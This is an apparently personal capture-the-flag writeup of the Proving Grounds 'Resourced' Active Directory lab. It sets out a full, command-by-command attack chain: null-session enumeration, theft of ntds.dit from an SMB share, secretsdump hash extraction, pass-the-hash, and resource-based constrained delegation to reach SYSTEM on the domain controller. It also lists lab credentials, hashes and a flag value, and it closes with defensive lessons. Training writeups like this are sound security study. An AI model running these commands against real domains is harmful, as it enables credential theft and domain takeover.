# 🏰 Resourced — Proving Grounds Practice Writeup

> **Platform:** Offensive Security Proving Grounds Practice
> **Difficulty:** Intermediate
> **OS:** Windows Server 2019 — Active Directory Domain Controller
> **Author:** [Tanvir Ahmed](https://github.com/Tanvir-2) | [Portfolio](https://tanvirkarim.it)
> **Status:** ✅ Completed
> **Tags:** `Active Directory` `RPC Enumeration` `enum4linux` `SMB` `NTDS.dit` `secretsdump` `Pass-the-Hash` `BloodHound` `RBCD` `S4U2Proxy` `Domain Compromise`

---

## 📋 Table of Contents

1. [Lab Overview](#lab-overview)
2. [Reconnaissance](#reconnaissance)
3. [RPC & SMB Enumeration](#rpc--smb-enumeration)
4. [Credential Leak — User Description](#credential-leak--user-description)
5. [Password Audit Share — NTDS.dit Theft](#password-audit-share--ntdsdit-theft)
6. [Dumping Domain Hashes (secretsdump)](#dumping-domain-hashes-secretsdump)
7. [Initial Access — Pass-the-Hash](#initial-access--pass-the-hash)
8. [Domain Enumeration — BloodHound](#domain-enumeration--bloodhound)
9. [Privilege Escalation — Resource-Based Constrained Delegation (RBCD)](#privilege-escalation--resource-based-constrained-delegation-rbcd)
10. [Flags](#flags)
11. [Attack Chain](#-attack-chain)
12. [Skills Demonstrated](#-skills-demonstrated)
13. [Lessons Learned](#-lessons-learned)
14. [References](#references)
15. [Tools Used](#tools-used)

---

## 🏛️ Lab Overview

| Field | Details |
|-------|---------|
| **Target IP** | `192.168.153.175` |
| **Hostname** | `RESOURCEDC` (ResourceDC.resourced.local) |
| **Domain** | `resourced.local` |
| **OS** | Windows Server 2019 (Build 10.0.17763) — Domain Controller |
| **Difficulty** | Intermediate |
| **Focus Areas** | AD enumeration, NTDS extraction, pass-the-hash, Resource-Based Constrained Delegation |

**Lab Summary:**
Resourced is an Active Directory box compromising a full domain. RPC and SMB enumeration leak a cleartext password hidden in a user's AD description field. Those credentials expose a "Password Audit" share containing a backup of `ntds.dit` and the SYSTEM registry hive — effectively the entire domain's credential store. `secretsdump` dumps every domain hash; a SysAdmin account's NT hash is replayed over WinRM. BloodHound reveals a write primitive that enables a **Resource-Based Constrained Delegation (RBCD)** attack, forging a Kerberos service ticket to impersonate the Domain Administrator and achieve SYSTEM on the DC.

---

## 🔍 Reconnaissance

### Port Scan

```bash
nmap -sC -sV -sS -A -T5 -p- -Pn 192.168.153.175
```

![Nmap Scan Results](screenshots/01_nmap_scan.png)

### Results

| Port | Service | Details |
|------|---------|---------|
| 53/tcp | domain | Simple DNS Plus |
| 88/tcp | kerberos-sec | Microsoft Windows Kerberos |
| 135/tcp | msrpc | Microsoft Windows RPC |
| 139/tcp | netbios-ssn | NetBIOS Session Service |
| 389/tcp | ldap | AD LDAP — Domain: `resourced.local` |
| 445/tcp | microsoft-ds | SMB |
| 464/tcp | kpasswd5 | Kerberos password change |
| 593/tcp | ncacn_http | RPC over HTTP 1.0 |
| 636/tcp | ldaps | LDAP over SSL |
| 3268/3269 | ldap/ldaps | Global Catalog |
| 3389/tcp | ms-wbt-server | RDP (CN=ResourceDC.resourced.local) |
| 5985/tcp | http | WinRM (Microsoft HTTPAPI 2.0) |
| 9389/tcp | mc-nmf | .NET Message Framing (AD Web Services) |

**Confirmed:** This is the **Domain Controller** for `resourced.local`. Add it to `/etc/hosts`:

```bash
echo "192.168.153.175 resourced.local resourcedc.resourced.local" | sudo tee -a /etc/hosts
```

**Port 53 (DNS)** — zone transfer attempted, failed:
```bash
dig @192.168.153.175 axfr resourced.local    # Transfer failed
```

---

## 🔗 RPC & SMB Enumeration

### Anonymous RPC — Enumerate Domain Users

```bash
rpcclient -U '' -N 192.168.153.175
rpcclient $> enumdomusers
```

![rpcclient enumdomusers](screenshots/02_rpcclient_enumdomusers.png)

**Domain user list recovered:**
```
Administrator   M.Mason      K.Keen         L.Livingstone
J.Johnson       V.Ventz      S.Swanson      P.Parker
R.Robinson      D.Durant     G.Goldberg     krbtgt / Guest
```

> **✅ Null-session RPC** exposed the entire domain user list — a prime source for password spraying and targeted attacks.

### enum4linux — Full Enumeration

```bash
enum4linux -a 192.168.153.175
```

![enum4linux Output](screenshots/03_enum4linux.png)

---

## 🔑 Credential Leak — User Description

`enum4linux` returned each account's **description field** — and one holds a cleartext password:

```
Account: V.Ventz   Desc: New-hired, reminder: HotelCalifornia194! specialist
Account: L.Livingstone   Desc: SysAdmin
Account: M.Mason   Desc: Ex IT admin
Account: R.Robinson   Desc: Database Admin
```

> **🎯 Critical Finding:** Admins stored a new hire's password in the **AD description attribute** — a world-readable field. This leaks a valid credential:

```
Username: V.Ventz
Password: HotelCalifornia194!
```

### Enumerate Shares with V.Ventz

```bash
smbclient -L \\\\192.168.153.175\\ -U resourced\\V.Ventz
```

![SMB Share Listing](screenshots/04_smbclient_shares.png)

```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share
Password Audit  Disk      <-- non-standard!
SYSVOL          Disk      Logon server share
```

> **⚠️ A non-standard `Password Audit` share** stands out immediately — exactly the kind of custom share that holds sensitive data.

---

## 📂 Password Audit Share — NTDS.dit Theft

### Recursively List the Share

```bash
smbclient \\\\192.168.153.175\\'Password Audit' -U resourced\\V.Ventz -c 'recurse;ls'
```

![Password Audit Recurse](screenshots/05_password_audit_recurse.png)

**Contents — a complete Active Directory backup:**
```
\Active Directory\ntds.dit       (25 MB)
\Active Directory\ntds.jfm
\registry\SECURITY
\registry\SYSTEM
```

> **🚨 Jackpot.** `ntds.dit` is the **Active Directory database** — it contains the NTLM hashes of *every* domain account. Paired with the SYSTEM hive (which holds the boot key needed to decrypt it), this is a complete offline domain compromise.

### Download the Critical Files

```bash
smbclient \\\\192.168.153.175\\'Password Audit' -U resourced\\V.Ventz
smb: \> cd "Active Directory"
smb: \Active Directory\> get ntds.dit
smb: \> cd registry
smb: \registry\> get SECURITY
smb: \registry\> get SYSTEM
```

![Download NTDS Files](screenshots/06_download_ntds.png)

---

## 🔓 Dumping Domain Hashes (secretsdump)

### Extract Hashes Offline

```bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

![secretsdump Output](screenshots/07_secretsdump.png)

**Domain hashes recovered (NT hashes):**
```
Administrator:500:...:12579b1666d4ac10f0f59300776495f:::
L.Livingstone:1105:...:19a3a7550ce8c505c2d46b5e39d6f808:::
V.Ventz:1107:...:3e028552b946cc4f282b72879f63b726:::
...(all domain accounts)...
```

Every domain hash is now in hand. The **L.Livingstone** account (`SysAdmin` per its description) is the priority target:

```
L.Livingstone : 19a3a7550ce8c505c2d46b5e39d6f808
```

> **💡 Alternative path:** The Administrator NT hash `12579b1666d4ac10f0f59300776495f` cracks online (CrackStation) to **`ItachiUchiha888`**, which would grant a direct Administrator login. The walkthrough below instead takes the more instructive **L.Livingstone → RBCD** route to SYSTEM.

---

## 🚪 Initial Access — Pass-the-Hash

No need to crack L.Livingstone's hash — replay it directly over WinRM:

```bash
evil-winrm -i 192.168.153.175 -u resourced.local\\L.Livingstone -H 19a3a7550ce8c505c2d46b5e39d6f808
```

![Evil-WinRM Pass-the-Hash](screenshots/08_evilwinrm_pth.png)

### Local Flag

```powershell
C:\Users\L.Livingstone\Desktop> dir
C:\Users\L.Livingstone\Desktop> type local.txt
```

![Local Flag](screenshots/09_local_txt.png)

```
local.txt: <paste value from your screenshot>
```

> **Note:** the `local.txt` value in the source capture was unclear in OCR — drop the exact string from your own screenshot here before publishing.

---

## 🩸 Domain Enumeration — BloodHound

### Check Privileges

```powershell
whoami /priv
```

![whoami /priv](screenshots/10_whoami_priv.png)

```
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

> **🎯 Key Finding:** `SeMachineAccountPrivilege` is **Enabled** — this account can **create new machine accounts** in the domain. This is the precondition for a Resource-Based Constrained Delegation attack.

### Collect with SharpHound

```powershell
C:\Users\L.Livingstone\Desktop> upload SharpHound.exe
C:\Users\L.Livingstone\Desktop> .\SharpHound.exe --CollectionMethods All --Domain resourced.local --ExcludeDCs --OutputPrefix "Dork"
```

![SharpHound Collection](screenshots/11_sharphound.png)

Download the resulting ZIP and import it into the BloodHound GUI:

```powershell
C:\Users\L.Livingstone\Desktop> download Dork_20250906202302_BloodHound.zip
```

### BloodHound Finding — Write Primitive

![BloodHound GenericAll](screenshots/12_bloodhound_genericall.png)

BloodHound maps a privileged relationship against `L.LIVINGSTONE` via the **Account Operators** group, confirming the account holds write access it can leverage. Verify the ACL from the shell with PowerView:

```powershell
Import-Module .\powerview.ps1
Get-ObjectAcl -SamAccountName l.livingstone -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq "GenericAll"}
```

![PowerView ACL](screenshots/13_powerview_acl.png)

> **🎯 The combination** of `SeMachineAccountPrivilege` (create machine accounts) plus write access over the target computer object enables a **Resource-Based Constrained Delegation (RBCD)** attack against the Domain Controller.
---

## 🔺 Privilege Escalation — Resource-Based Constrained Delegation (RBCD)

RBCD lets a computer object be configured to allow another account to impersonate any user to it. The chain: (1) create a machine account, (2) write that account into the DC's `msDS-AllowedToActOnBehalfOfOtherIdentity`, (3) use S4U2Proxy to request a service ticket as the Domain Administrator.

### Step 1 — Create a Machine Account

Using `L.Livingstone`'s hash (pass-the-hash), create a new computer object `DORK$`:

```bash
impacket-addcomputer resourced.local/l.livingstone -dc-ip 192.168.153.175 \
  -hashes :19a3a7550ce8c505c2d46b5e39d6f808 \
  -computer-name 'DORK$' -computer-pass 'Dork123!'
```

![Add Computer Account](screenshots/14_addcomputer.png)

### Step 2 — Configure Delegation Rights

Write the `DORK$` SID into the DC's `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute using [rbcd.py](https://github.com/tothi/rbcd-attack):

```bash
python3 rbcd.py -dc-ip 192.168.153.175 -t RESOURCEDC -f 'DORK' \
  -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced\\l.livingstone
```

![rbcd.py Delegation](screenshots/15_rbcd.png)

```
[+] Delegation rights modified successfully!
[+] DORK$ can now impersonate users on RESOURCEDC$ via S4U2Proxy
```

### Step 3 — Request Impersonation Ticket (S4U2Proxy)

Request a `cifs` service ticket impersonating the Domain Administrator:

```bash
impacket-getST -spn cifs/resourcedc.resourced.local resourced/dork\$:'Dork123!' \
  -impersonate Administrator -dc-ip 192.168.153.175
```

![getST Ticket](screenshots/16_getst.png)

```
[*] Saving ticket in Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache
```

### Step 4 — Use the Ticket (Pass-the-Ticket)

```bash
export KRB5CCNAME=./Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache
impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.153.175
```

![psexec SYSTEM Shell](screenshots/17_psexec_system.png)

```
[*] Found writable share ADMIN$
[*] Creating service GGuF on resourcedc.resourced.local.....
Microsoft Windows [Version 10.0.17763.2145]
C:\Windows\system32> whoami
nt authority\system
```

> **🏆 Full domain compromise** — SYSTEM on the Domain Controller.

---

## 🚩 Flags

```cmd
C:\Users\Administrator\Desktop> type proof.txt
```

![Proof Flag](screenshots/18_proof_txt.png)

| Flag | Location | Value |
|------|----------|-------|
| **local.txt** | `C:\Users\L.Livingstone\Desktop\local.txt` | *(paste from your screenshot)* |
| **proof.txt** | `C:\Users\Administrator\Desktop\proof.txt` | `a32136c820030a5104dc8a9ebe95b041` |

---

## 🗺️ Attack Chain

```
┌─────────────────────────────────────────────────────────────────────────┐
│                      RESOURCED — ATTACK CHAIN                          │
└─────────────────────────────────────────────────────────────────────────┘

[Attacker 192.168.x.x]
        │
        │ 1. Nmap → DC for resourced.local (DNS, Kerberos, LDAP, SMB, WinRM)
        ▼
[Anonymous RPC :135]
        │
        │ 2. rpcclient null session → enumdomusers → full user list
        │ 3. enum4linux -a → reads AD description fields
        ▼
[Credential Leak — AD description]
        │
        │ 4. V.Ventz desc: "reminder: HotelCalifornia194!"
        │        → V.Ventz : HotelCalifornia194!
        ▼
[SMB :445 — authenticated as V.Ventz]
        │
        │ 5. smbclient -L → non-standard "Password Audit" share
        │ 6. Share holds AD backup: ntds.dit + SYSTEM + SECURITY hives
        │ 7. Download ntds.dit, SYSTEM, SECURITY
        ▼
[Offline Hash Extraction]
        │
        │ 8. impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
        │        → ALL domain NT hashes dumped
        │        L.Livingstone (SysAdmin) : 19a3a7550ce8c505c2d46b5e39d6f808
        │        Administrator : 12579b...495f  (cracks → ItachiUchiha888)
        ▼
[Initial Access — Pass-the-Hash]
        │
        │ 9. evil-winrm -u L.Livingstone -H 19a3a7...f808
        │ 10. local.txt
        │ 11. whoami /priv → SeMachineAccountPrivilege: Enabled ⭐
        ▼
[Domain Enumeration — BloodHound]
        │
        │ 12. SharpHound.exe → BloodHound ZIP
        │ 13. Write primitive over computer object + machine-account right
        │        → RBCD is viable
        ▼
[Privilege Escalation — RBCD / S4U2Proxy]
        │
        │ 14. impacket-addcomputer → create DORK$ : Dork123!
        │ 15. rbcd.py → write DORK$ into DC's
        │        msDS-AllowedToActOnBehalfOfOtherIdentity
        │ 16. impacket-getST -impersonate Administrator → .ccache
        │ 17. export KRB5CCNAME ; impacket-psexec -k -no-pass
        ▼
[NT AUTHORITY\SYSTEM on the Domain Controller]
        │
        │ 18. type proof.txt → a32136c820030a5104dc8a9ebe95b041
        ▼
[🏆 DOMAIN PWNED]
```

---

## 🛡️ Skills Demonstrated

| # | Skill | MITRE ATT&CK Technique | TTP ID |
|---|-------|------------------------|--------|
| 1 | Port scanning & DC identification | Network Service Discovery | T1046 |
| 2 | Null-session RPC user enumeration | Account Discovery: Domain Account | T1087.002 |
| 3 | SMB/AD enumeration (enum4linux) | Permission Groups Discovery | T1069.002 |
| 4 | Credential harvesting from AD descriptions | Unsecured Credentials | T1552 |
| 5 | Authenticated SMB share enumeration | Network Share Discovery | T1135 |
| 6 | NTDS.dit + SYSTEM hive exfiltration | OS Credential Dumping: NTDS | T1003.003 |
| 7 | Offline hash extraction (secretsdump) | OS Credential Dumping | T1003 |
| 8 | NTLM hash cracking (alt. path) | Brute Force: Password Cracking | T1110.002 |
| 9 | Pass-the-Hash over WinRM | Use Alternate Auth Material: PtH | T1550.002 |
| 10 | AD attack-path mapping (BloodHound) | Domain Trust Discovery | T1482 |
| 11 | Machine account creation | Create Account: Domain Account | T1136.002 |
| 12 | Resource-Based Constrained Delegation abuse | Domain Policy Modification | T1484 |
| 13 | S4U2Proxy ticket forging | Steal/Forge Kerberos Tickets | T1558 |
| 14 | Pass-the-Ticket → SYSTEM on DC | Use Alternate Auth Material: PtT | T1550.003 |

---

## 📚 Lessons Learned

### 🔴 Offensive Perspective

1. **Always read AD description fields.** The entire chain started with a password an admin typed into `V.Ventz`'s description attribute. `enum4linux`, `ldapsearch`, and BloodHound all surface these — they are frequently overlooked gold.

2. **Non-standard SMB shares are high-value.** A share named "Password Audit" sitting beside the defaults is an instant priority. Here it held a full `ntds.dit` backup — game over before a single hash was cracked.

3. **NTDS.dit + SYSTEM hive = the whole domain.** You never need code execution on the DC to dump it if a backup is readable. `secretsdump` turns those two files into every account's NT hash offline.

4. **Pass-the-Hash beats cracking.** L.Livingstone's hash never needed cracking — `evil-winrm -H` replays it directly. Cracking is only for cases where cleartext is genuinely required.

5. **RBCD is a top AD escalation primitive.** `SeMachineAccountPrivilege` (default `ms-DS-MachineAccountQuota = 10`) plus write access over a computer object is all it takes to impersonate a Domain Admin via S4U2Proxy — no admin credentials required.

### 🔵 Defensive Perspective

1. **Never store passwords in AD attributes.** Description, info, and comment fields are readable by any authenticated user (often anonymously). Secrets belong in a privileged-access vault, never in directory metadata. Audit these fields regularly.

2. **Lock down anonymous/null-session RPC & SMB.** Restrict `RestrictAnonymous` / `RestrictAnonymousSAM` and disable null-session enumeration so attackers cannot freely pull the domain user list.

3. **Protect NTDS backups like the crown jewels.** A `ntds.dit` export on an open SMB share is equivalent to publishing every domain credential. Backups must be encrypted, access-controlled, and never reachable by standard user accounts.

4. **Set `ms-DS-MachineAccountQuota` to 0.** Preventing non-admin users from creating machine accounts removes the precondition for RBCD and many other delegation attacks. Monitor writes to `msDS-AllowedToActOnBehalfOfOtherIdentity`.

5. **Monitor for credential-dumping and delegation abuse.** Alert on NTDS access, Kerberos S4U2Proxy requests, new computer-account creation by user accounts, and anomalous `psexec`-style service creation on the DC.

### 🟡 Key Takeaways

- **Enumeration wins AD boxes** — the breakthrough was reading a text field, not an exploit.
- **One readable backup can equal full domain compromise** — the `ntds.dit` on the share short-circuited the entire kill chain.
- **Default AD settings are dangerous** — `MachineAccountQuota = 10` ships enabled and directly enables RBCD.
- **Hashes are credentials** — PtH and PtT mean you rarely need cleartext to move laterally or escalate in a domain.

---

## 📎 References

| Resource | URL |
|----------|-----|
| rbcd-attack (tothi) | https://github.com/tothi/rbcd-attack |
| Impacket | https://github.com/fortra/impacket |
| BloodHound | https://github.com/SpecterOps/BloodHound |
| Elad Shamir — Wagging the Dog (RBCD) | https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html |
| MITRE ATT&CK — OS Credential Dumping: NTDS | https://attack.mitre.org/techniques/T1003/003/ |
| MITRE ATT&CK — Use Alternate Auth Material | https://attack.mitre.org/techniques/T1550/ |
| MITRE ATT&CK — Steal or Forge Kerberos Tickets | https://attack.mitre.org/techniques/T1558/ |
| Offensive Security Proving Grounds | https://www.offsec.com/labs/individual/ |

---

## 🧰 Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Port scanning and DC identification |
| `rpcclient` | Null-session domain user enumeration |
| `enum4linux` | SMB/AD enumeration, reading description fields |
| `smbclient` | Authenticated share enumeration and file download |
| `impacket-secretsdump` | Offline NTDS.dit hash extraction |
| CrackStation (alt.) | Online NTLM hash cracking |
| `evil-winrm` | Pass-the-Hash WinRM access |
| `SharpHound` / BloodHound | AD attack-path mapping |
| PowerView | ACL verification from the shell |
| `impacket-addcomputer` | Machine account creation (DORK$) |
| `rbcd.py` | Configuring delegation rights |
| `impacket-getST` | S4U2Proxy ticket request (impersonate Administrator) |
| `impacket-psexec` | Pass-the-Ticket → SYSTEM shell on the DC |

---

<div align="center">

**[⬅ Back to Portfolio](https://github.com/Tanvir-2) | [🌐 tanvirkarim.it](https://tanvirkarim.it)**

*Resourced — Proving Grounds Practice | Intermediate | Active Directory Full Domain Compromise*

</div>
